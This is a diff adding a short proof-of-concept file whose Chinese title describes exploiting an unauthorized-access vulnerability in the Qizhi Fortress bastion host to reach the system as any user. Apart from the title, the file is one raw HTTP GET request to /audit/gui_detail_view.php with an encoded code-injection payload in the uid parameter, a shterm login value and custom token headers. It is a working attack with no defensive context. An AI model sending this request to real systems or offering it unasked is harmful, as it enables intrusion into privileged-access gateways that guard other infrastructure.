@@ -1,0 +1,9 @@
+# 利用【Qizhi Fortressaircraft 未授权访问漏洞任意用户访问系统】-30000295
+# 利用Qizhi Fortressaircraft 未授权访问漏洞任意用户访问系统
+GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm&acid=30000295&bid=hd_tag_m8mv25m3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25m3
+RM-PRO-Token: a01bcf5961525055bd6c70bfa4dc3eb2
+RM-PRO-Time: 1742808480089
+User-Agent: curl/7.83.1
+
